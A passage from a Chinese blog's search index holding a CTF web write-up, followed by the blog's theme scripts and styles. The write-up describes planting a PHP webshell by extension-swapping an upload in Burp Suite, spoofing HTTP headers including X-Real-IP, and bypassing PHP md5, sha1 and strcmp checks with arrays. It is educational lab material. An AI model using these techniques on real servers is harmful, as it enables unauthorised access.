class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p><img src="https://s2.loli.net/2023/10/01/ZNRz39BTIXCEoik.png" alt="1"><br>经典文件上传,那么先尝试一句话木马直接上传<br><img src="https://s2.loli.net/2023/10/01/ol5xHiSb1XVwstn.png" alt="1"><br><img src="https://s2.loli.net/2023/10/01/Pz6LXqfugHVcWmS.png" alt="1"><br>上传后发现网页过滤格式,那么我采取改成合法后缀上传后抓包再改包的这种方法植入后门<br>那么接下来改好后缀上传,直接用burpsuite抓取这个数据包<br><img src="https://s2.loli.net/2023/10/01/OpfelavXB5r1Yzn.png" alt="1"><br>此时上传就成功了,也从burpsuite内抓到了数据包<br><img src="https://s2.loli.net/2023/10/01/7ilReQJprIZy5f6.png" alt="1"><br>那么这时将这里的后缀改成php,再发回给服务器,这个木马就生效了<br><img src="https://s2.loli.net/2023/10/01/ueyiL9S78NkUXoR.png" alt="1"><br>好,这样就可以用webshell操作了,这里我用中国蚁剑操作一下<br><img src="https://s2.loli.net/2023/10/01/UCYgaBGstxfE2Ah.png" alt="1"><br>ok确认植入成功了,我们的这个木马文件也能看到在里面了,这样就可以去翻看这个服务器的各种文件了,在这之间应该就能找到本题藏有flag的文件<br><img src="https://s2.loli.net/2023/10/01/ITj5oaCKFJg3crf.png" alt="1"><br>找到了,打开这个文件看看就是答案了<br><img src="https://s2.loli.net/2023/10/01/Babp5ygEOMi6UPq.png" alt="1"></p><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p><img src="https://s2.loli.net/2023/10/01/XO6Yu5DkE8cRGj1.png" alt="1"><br>映入眼帘的就是传get参数,估计后面也会有post请求,那么我直接用hackbar来做了<br><img src="https://s2.loli.net/2023/10/01/3Xfe6si98MaEhov.png" alt="1"><br>果然下一步就是传post参数,但是需要找一找secret的值<br><img src="https://s2.loli.net/2023/10/01/gxBGPLs3EuvOAUy.png" alt="1"><br>从网页源码翻翻就找到了,base64解个码传上去<br><img src="https://s2.loli.net/2023/10/01/vl8CdaHPknuz5gt.png" alt="1"><br>ok传好值了,接下来看看请求头部分有没有信息吧<br><img src="https://s2.loli.net/2023/10/01/p9RZ3f8aeEJqH15.png" alt="1"><br>发现cookie部分有题目要求的验证内容,将其改成ctfer<br><img src="https://s2.loli.net/2023/10/01/xuUStgeFZ3NQwO7.png" alt="1"><br>成功,又是一关,依旧是改请求头部分,这次因为是浏览器指定要求,那么就修改User Agent部分为题目要求<br><img src="https://s2.loli.net/2023/10/01/gPBUu2vTrxQ8RoG.png" alt="1"><br>好了又是经典改请求头,这次是修改referer部分<br><img src="https://s2.loli.net/2023/10/01/ZvuChPbkrydGEs5.png" alt="1"><br>终于到最后了,也是经典套路本地访问,经过多次尝试试出了是哪条语句生效<br><img src="https://s2.loli.net/2023/10/01/BskA2rYRNiSVq3j.png" alt="1"><br>为了方便一次性尝试我用的burpsuite抓包一次性都写进去发包,但是坐大牢了,整了半天发现最后是X-real-IP这条语句才能生效,不过最后也是成功了<br>那么这次就用hackbar演示一下结果吧<br><img src="https://s2.loli.net/2023/10/01/lKCOuchso8JQIbY.png" alt="1"><br>PS: 最后一部分通过和我亲爱的蓝学长讨论,得知到更简单的伪造ip方法在此致谢此大佬</p><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p><img src="https://s2.loli.net/2023/10/01/eFNwvEpmSZ2WcTf.png" alt="1"><br>开局看到这个提示一时间想到传参,但不清楚Flask是什么东西,通过查阅得知Flask是一个网页的框架,也是可以接收正常请求的<br>我尝试着传了这两个指定的参数<br><img src="https://s2.loli.net/2023/10/01/rdVfzQHpY5Ui8gE.png" alt="1"><br>发现出现这样的提示,得知flag就在源码中,但Flask框架的源码目前不清楚怎么查看,我又进行了几次尝试<br>此时发现如果传入的不是数字就会有这样的页面<br><img src="https://s2.loli.net/2023/10/01/bPcDzuXOjKh1Yn2.png" alt="1"><br>当时对这个界面确实匪夷所思,一直想着是不是还是对参数的改变才能得出答案,但是仔细一想这题的主要内容是Flask,经过长时间的周转我打算仔细看看这个显示出来的界面<br>结果细看发现这不就是源码吗..通过翻找就找到了flag<br><img src="https://s2.loli.net/2023/10/01/QTWLrlh1FBG6JxK.png" alt="1"><br>(这题确实没想到这么简单,之前和贺同学交流得知如果是ssti漏洞就会难不少)</p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p><img src="https://s2.loli.net/2023/10/01/worm4qKu5RAx7JD.png" alt="1"><br>翻翻这道题,发现是有五层保护,需要一层一层绕过<br>那么先来到第一层,要求key1和key2不同但md5加密后相同,那就根据md5加密的机制传两个不一样的数组<br><img src="https://s2.loli.net/2023/10/01/dAv3YqSWOTVsnZ8.png" alt="1"><br>如图,第一层就过了<br>第二层是传个post参数经过md5加密和sha1加密后强相等才能通过,那就再传个数组呗<br><img src="https://s2.loli.net/2023/10/01/VindBhLTReYN2P9.png" alt="1"><br>好也过了<br><img src="https://s2.loli.net/2023/10/01/MhKFgRYa8Eu5jxQ.png" alt="1"><br>到第三层了,发现是一个字符比较,但strcmp()函数无法比较数组,所以我继续传个数组<br><img src="https://s2.loli.net/2023/10/01/OPqmvW4wUrHanlT.png" alt="1"><br>果然过了,接下来看看第四层吧<br><img src="https://s2.loli.net/2023/10/01/5DFvHbstpLX1d3V.png" alt="1"><br>第四层发现不能传数字并且值要大于2023,那可以利用php中数组类型一定比整数类型大的特点,我们随便传上一个数组<br><img src="https://s2.loli.net/2023/10/01/C6L85GZiDcfOEAR.png" alt="1"><br>第四层就过了,看看第五层是什么成分<br><img src="https://s2.loli.net/2023/10/01/zaP3JMmIbsOgQXk.png" alt="1"><br>仔细看看,发现这个flag5需要自己传,而且根据前两句函数发现传的post数组中的值和键会被取出当成单独的值,并将这些值和其他post传的参赋给var,之后根据这个正则表达式过滤一切字母和数字<br>那么我们之前传的post参数key3数组里就不能有数字,且之后传的flag5里也不能有数字<br>这样我们可以给key3数组赋任意的符号来绕过这个正则并且第二层的通过也不会失效(因为依旧是数组),而flag5可以考虑通过构造flag5&#x3D;’ ‘这样的payload来绕过正则,且这样的表示也为真,这样if语句执行,flag就展现在眼前了<br><img src="https://s2.loli.net/2023/10/01/9hG3SpflDjHks4E.png" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序言</title>
      <link href="/2023/08/25/2023-8-25-%E5%BA%8F%E8%A8%80/"/>
      <url>/2023/08/25/2023-8-25-%E5%BA%8F%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2>]]></content>
      
      
      <categories>
          
          <category> 序言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序言 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<!-- GitCalendar容器 --><div id="gitZone"> </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/lib_runtime.js"/>
      <url>/js/lib_runtime.js</url>
      
        <content type="html"><![CDATA[setInterval(() => {  let create_time = Math.round(new Date('2023-8-19 13:34:00').getTime() / 1000); //在此行修改建站时间  let timestamp = Math.round((new Date().getTime()) / 1000);  let second = timestamp - create_time;  let time = new Array(0, 0, 0, 0, 0);  var nol = function(h){    return h>9?h:'0'+h;  }  if (second >= 365 * 24 * 3600) {    time[0] = parseInt(second / (365 * 24 * 3600));    second %= 365 * 24 * 3600;  }  if (second >= 24 * 3600) {    time[1] = parseInt(second / (24 * 3600));    second %= 24 * 3600;  }  if (second >= 3600) {    time[2] = nol(parseInt(second / 3600));    second %= 3600;  }  if (second >= 60) {    time[3] = nol(parseInt(second / 60));    second %= 60;  }  if (second > 0) {    time[4] = nol(second);  }  if ((Number(time[2])<22) && (Number(time[2])>7)){    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-营业中-6adea8?style=social&logo=cakephp' title='距离第十八层还有不少距离哦'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  else{    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-打烊了-6adea8?style=social&logo=coffeescript' title='这里的人也是要休息的QWQ'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  document.getElementById("workboard").innerHTML = currentTimeHtml;}, 1000);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[:root {  --trans-light: rgba(255, 255, 255, 0.88);  --trans-dark: rgba(25, 25, 25, 0.88);  --border-style: 1px solid rgb(169, 169, 169);  --backdrop-filter: blur(5px) saturate(150%);}/* 页脚与头图透明 */#footer {    background: transparent !important;  }  #page-header {    background: transparent !important;  }    /* 白天模式遮罩透明 */  #footer::before {    background: transparent !important;  }  #page-header::before {    background: transparent !important;  }    /* 夜间模式遮罩透明 */  [data-theme="dark"] #footer::before {    background: transparent !important;  }  [data-theme="dark"] #page-header::before {    background: transparent !important;  }  /* 小冰分类分类磁铁黑夜模式适配 */  /* 一般状态 */  [data-theme="dark"] .magnet_link_context {      background: #1e1e1e;      color: antiquewhite;  }  /* 鼠标悬浮状态 */  [data-theme="dark"] .magnet_link_context:hover {      background: #3ecdf1;      color: #f2f2f2;  }  /* 翻页按钮居中 */  #pagination {    width: 100%;    margin: auto;   }     /* 日间模式不生效 */     [data-theme="light"] #site-name,     [data-theme="light"] #site-title,     [data-theme="light"] #site-subtitle,     [data-theme="light"] #post-info {       animation: none;     }       /* 夜间模式生效 */     [data-theme="dark"] #site-name,     [data-theme="dark"] #site-title {       animation: light_15px 10s linear infinite;     }       [data-theme="dark"] #site-subtitle {       animation: light_10px 10s linear infinite;     }       [data-theme="dark"] #post-info {       animation: light_5px 10s linear infinite;     }       /* 关键帧描述 */     @keyframes light_15px {       0% {         text-shadow: #5636ed 0 0 15px;       }         12.5% {         text-shadow: #11ee5e 0 0 15px;       }         25% {         text-shadow: #f14747 0 0 15px;       }         37.5% {         text-shadow: #f1a247 0 0 15px;       }         50% {         text-shadow: #f1ee47 0 0 15px;       }         50% {         text-shadow: #b347f1 0 0 15px;       }         62.5% {         text-shadow: #002afa 0 0 15px;       }         75% {         text-shadow: #ed709b 0 0 15px;       }         87.5% {         text-shadow: #39c5bb 0 0 15px;       }         100% {         text-shadow: #5636ed 0 0 15px;       }     }       @keyframes light_10px {       0% {         text-shadow: #5636ed 0 0 10px;       }         12.5% {         text-shadow: #11ee5e 0 0 10px;       }         25% {         text-shadow: #f14747 0 0 10px;       }         37.5% {         text-shadow: #f1a247 0 0 10px;       }         50% {         text-shadow: #f1ee47 0 0 10px;       }         50% {         text-shadow: #b347f1 0 0 10px;       }         62.5% {         text-shadow: #002afa 0 0 10px;       }         75% {         text-shadow: #ed709b 0 0 10px;       }         87.5% {         text-shadow: #39c5bb 0 0 10px;       }         100% {         text-shadow: #5636ed 0 0 10px;       }     }       @keyframes light_5px {       0% {         text-shadow: #5636ed 0 0 5px;       }         12.5% {         text-shadow: #11ee5e 0 0 5px;       }         25% {         text-shadow: #f14747 0 0 5px;       }         37.5% {         text-shadow: #f1a247 0 0 15px;       }         50% {         text-shadow: #f1ee47 0 0 5px;       }         50% {         text-shadow: #b347f1 0 0 5px;       }         62.5% {         text-shadow: #002afa 0 0 5px;       }         75% {         text-shadow: #ed709b 0 0 5px;       }         87.5% {         text-shadow: #39c5bb 0 0 5px;       }         100% {         text-shadow: #5636ed 0 0 5px;       }     }         /* 侧边栏个人信息卡片动态渐变色 */         #aside-content>.card-widget.card-info {           background: linear-gradient(-45deg,               #e8d8b9,               #eccec5,               #a3e9eb,               #bdbdf0,               #eec1ea);           box-shadow: 0 0 5px rgb(66, 68, 68);           position: relative;           background-size: 400% 400%;           -webkit-animation: Gradient 10s ease infinite;           -moz-animation: Gradient 10s ease infinite;           animation: Gradient 10s ease infinite !important;         }             @-webkit-keyframes Gradient {           0% {             background-position: 0% 50%;           }               50% {             background-position: 100% 50%;           }               100% {             background-position: 0% 50%;           }         }             @-moz-keyframes Gradient {           0% {             background-position: 0% 50%;           }               50% {             background-position: 100% 50%;           }               100% {             background-position: 0% 50%;           }         }             @keyframes Gradient {           0% {             background-position: 0% 50%;           }               50% {             background-position: 100% 50%;           }               100% {             background-position: 0% 50%;           }         }             /* 黑夜模式适配 */         [data-theme="dark"] #aside-content>.card-widget.card-info {           background: #191919ee;         }             /* 个人信息Follow me按钮 */         #aside-content>.card-widget.card-info>#card-info-btn {           background-color: #3eb8be;           border-radius: 8px;         }/* 首页文章卡片 */#recent-posts>.recent-post-item {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 25px;  border: var(--border-style);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 18px;  border: var(--border-style);}/* 文章页、归档页、普通页面 */div#post,div#page,div#archive {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border: var(--border-style);  border-radius: 20px;}/* 导航栏 */#page-header.nav-fixed #nav {  background: rgba(255, 255, 255, 0.75);  backdrop-filter: var(--backdrop-filter);}[data-theme="dark"] #page-header.nav-fixed #nav {  background: rgba(0, 0, 0, 0.7) !important;}/* 夜间模式遮罩 */[data-theme="dark"] #recent-posts>.recent-post-item,[data-theme="dark"] #aside-content .card-widget,[data-theme="dark"] div#post,[data-theme="dark"] div#archive,[data-theme="dark"] div#page {  background: var(--trans-dark);}/* 夜间模式页脚页头遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}/* 阅读模式 */.read-mode #aside-content .card-widget {  background: rgba(158, 204, 171, 0.5) !important;}.read-mode div#post {  background: rgba(158, 204, 171, 0.5) !important;}/* 夜间模式下的阅读模式 */[data-theme="dark"] .read-mode #aside-content .card-widget {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}[data-theme="dark"] .read-mode div#post {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
        <content type="html"><![CDATA[var now = new Date; function createtime() { now.setTime(now.getTime() + 1e3); var e = new Date("08/01/2022 00:00:00"), t = Math.trunc(234e8 + (now - e) / 1e3 * 17), a = (t / 1496e5).toFixed(6), o = new Date("08/09/2022 00:00:00"), n = (now - o) / 1e3 / 60 / 60 / 24, r = Math.floor(n), i = (now - o) / 1e3 / 60 / 60 - 24 * r, s = Math.floor(i); 1 == String(s).length && (s = "0" + s); var d = (now - o) / 1e3 / 60 - 1440 * r - 60 * s, l = Math.floor(d); 1 == String(l).length && (l = "0" + l); var g = (now - o) / 1e3 - 86400 * r - 3600 * s - 60 * l, b = Math.round(g); 1 == String(b).length && (b = "0" + b); let c = ""; c = s < 18 && s >= 9 ? `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-科研摸鱼中.svg' title='什么时候能够实现财富自由呀~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>` : `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-下班休息啦.svg' title='下班了就该开开心心地玩耍~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = c) } setInterval((() => { createtime() }), 1e3);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标题</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
